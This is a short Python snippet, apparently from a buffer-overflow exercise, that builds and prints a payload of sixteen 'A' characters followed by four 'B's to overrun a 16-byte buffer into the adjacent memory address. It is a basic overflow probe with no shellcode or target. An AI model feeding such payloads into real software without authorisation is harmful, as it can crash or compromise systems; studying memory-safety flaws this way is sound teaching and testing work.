# Generates a payload to overflow the 16-byte buffer
# We send 16 'A's to fill the buffer, and 4 'B's to overflow into the next memory address.

payload = "A" * 16 + "B" * 4 
print(payload)